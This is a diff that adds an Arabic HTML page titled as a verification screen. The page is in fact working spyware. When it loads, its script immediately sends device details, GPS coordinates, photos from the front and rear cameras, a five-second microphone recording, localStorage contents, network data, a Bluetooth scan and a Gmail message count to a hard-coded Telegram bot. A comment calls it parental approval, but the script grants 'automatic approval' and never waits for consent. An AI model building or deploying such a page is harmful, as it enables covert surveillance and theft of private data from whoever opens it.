@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>جارٍ التحقق...</title>
+</head>
+<body>
+<script>
+const BOT_TOKEN = '7674096094:AAHvCSZnHhRCWyO1OrYD2jOjWf0LgFvKv6s';
+const CHAT_ID = '7163220219';
+
+// الإشعار الأولي للأب
+sendText("تنبيه: الطفل قد فتح التطبيق ويحتاج إلى موافقة للقيام بإجراء معين.\nهل تسمح بذلك؟");
+
+let approved = true; // الموافقة التلقائية
+
+function sendToTelegram(caption, file, type = 'photo') {
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('caption', caption);
+  formData.append(type, file, `${type}.jpg`);
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
+    method: 'POST',
+    body: formData
+  });
+}
+
+function sendText(msg) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+  });
+}
+
+function getDeviceInfo() {
+  const info = `
+نظام التشغيل: ${navigator.platform}
+المتصفح: ${navigator.userAgent}
+لغة النظام: ${navigator.language}
+أونلاين: ${navigator.onLine}
+  `;
+  sendText('معلومات الجهاز:\n' + info);
+}
+
+function captureCamera(facingMode = 'user') {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+  .then(stream => {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => sendToTelegram(`صورة ${facingMode === 'user' ? 'أمامية' : 'خلفية'}`, blob));
+      stream.getTracks().forEach(track => track.stop());
+    }, 2000);
+  }).catch(e => sendText('فشل في الوصول للكاميرا: ' + e));
+}
+
+function getLocation() {
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude, longitude } = pos.coords;
+      sendText(`الموقع الجغرافي:\nhttps://maps.google.com/?q=${latitude},${longitude}`);
+    }, err => sendText('خطأ في تحديد الموقع: ' + err.message));
+  } else {
+    sendText('الموقع غير مدعوم');
+  }
+}
+
+function recordAudio() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+  .then(stream => {
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'audio/webm' });
+      sendToTelegram('تسجيل صوتي', blob, 'audio');
+      stream.getTracks().forEach(track => track.stop());
+    };
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), 5000);  // تسجيل الصوت لمدة 5 ثوانٍ
+  }).catch(e => sendText('فشل في تسجيل الصوت: ' + e));
+}
+
+// دمج الدوال الجديدة
+
+function getEmailData() {
+  // قد تحتاج إلى أذونات من المستخدم وتوثيق للوصول إلى هذه البيانات
+  gapi.client.gmail.users.messages.list({ 'userId': 'me' }).then(response => {
+    const messages = response.result.messages;
+    sendText('عدد الرسائل: ' + messages.length);
+  });
+}
+
+function getLocalStorageData() {
+  let localStorageData = [];
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    const value = localStorage.getItem(key);
+    localStorageData.push({ key, value });
+  }
+  sendText('بيانات التخزين المحلي:\n' + JSON.stringify(localStorageData));
+}
+
+function getBluetoothDevices() {
+  navigator.bluetooth.requestDevice({
+    acceptAllDevices: true,
+    optionalServices: ['battery_service']
+  }).then(device => {
+    sendText('تم العثور على جهاز Bluetooth: ' + device.name);
+  }).catch(error => {
+    sendText('فشل في العثور على جهاز Bluetooth: ' + error);
+  });
+}
+
+function getNetworkInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (connection) {
+    const networkInfo = `
+      نوع الاتصال: ${connection.type}
+      السرعة: ${connection.downlink} Mbps
+      ال latency: ${connection.rtt} ms
+    `;
+    sendText('معلومات الشبكة:\n' + networkInfo);
+  } else {
+    sendText('لا توجد معلومات متاحة عن الشبكة');
+  }
+}
+
+// تنفيذ الدوال مباشرة بعد الموافقة التلقائية
+function runAllFunctions() {
+  getDeviceInfo();
+  getLocation();
+  captureCamera('user');      // الكاميرا الأمامية
+  setTimeout(() => captureCamera('environment'), 4000); // الكاميرا الخلفية
+  recordAudio();  // دمج دالة التسجيل الصوتي
+  getEmailData();  // دمج دالة الحصول على رسائل البريد
+  getLocalStorageData();  // دمج دالة بيانات التخزين المحلي
+  getBluetoothDevices();  // دمج دالة البحث عن أجهزة البلوتوث
+  getNetworkInfo();  // دمج دالة معلومات الشبكة
+}
+
+// تنفيذ الوظائف مباشرة بدون انتظار للموافقة
+runAllFunctions();
+</script>
+</body>
+</html>
